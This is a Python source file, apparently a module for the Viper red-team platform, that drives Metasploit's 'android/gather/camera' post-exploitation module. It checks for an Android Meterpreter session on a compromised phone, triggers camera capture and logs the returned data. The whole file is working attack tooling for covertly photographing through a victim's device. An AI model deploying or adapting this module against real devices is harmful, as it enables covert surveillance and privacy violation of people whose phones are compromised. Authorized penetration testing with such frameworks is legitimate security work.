# -*- coding: utf-8 -*-
# @File  : SimplePostPythonModule.py
# @Date  : 2019/1/12
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "手机摄像头拍照"
    DESC_ZH = "手机摄像头拍照(Android)\n"

    NAME_EN = "Take photos with mobile camera"
    DESC_EN = "Take photos with mobile camera(Android).\n"
    MODULETYPE = TAG2TYPE.Discovery
    PLATFORM = ["Android"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = []  # ATTCK向量
    README = []
    REFERENCES = []
    AUTHOR = ["Viper"]
    REQUIRE_SESSION = True

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "android/gather/camera"

    def check(self):
        """执行前的检查函数"""
        self.session = Session(self._sessionid)
        if self.session.platform.lower().startswith('android') is not True:
            return False, "模块只支持Android平台的Meterpreter", "Module only supports Meterpreter for Android"
        return True, None

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
            return
        try:
            for key in data:
                self.log_good(f"{key} : {data.get(key)}")

        except Exception as E:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_except(str(E), str(E))
